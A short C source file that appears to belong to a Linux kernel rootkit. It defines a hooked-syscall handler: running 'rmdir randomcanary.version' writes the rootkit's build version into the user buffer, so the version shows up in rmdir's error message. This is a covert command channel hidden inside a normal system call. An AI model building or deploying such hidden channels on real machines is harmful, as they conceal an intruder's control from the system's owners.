#include <linux/uaccess.h>

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

#include "../../../logger/logger.h"
#include "version.h"

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

/*
 * Edit response message to include compiled version, like:
$ rmdir dza
rmdir: failed to remove 'dza': No such file or directory
$ rmdir randomcanary.version
rmdir: failed to remove '1752410256:3deaeb6': No such file or directory
 */
int version(const struct pt_regs *regs, char *argv[], int argc) {
    copy_to_user((void __user *)regs->di, RK_VERSION, strlen(RK_VERSION) + 1);
    return 0;
}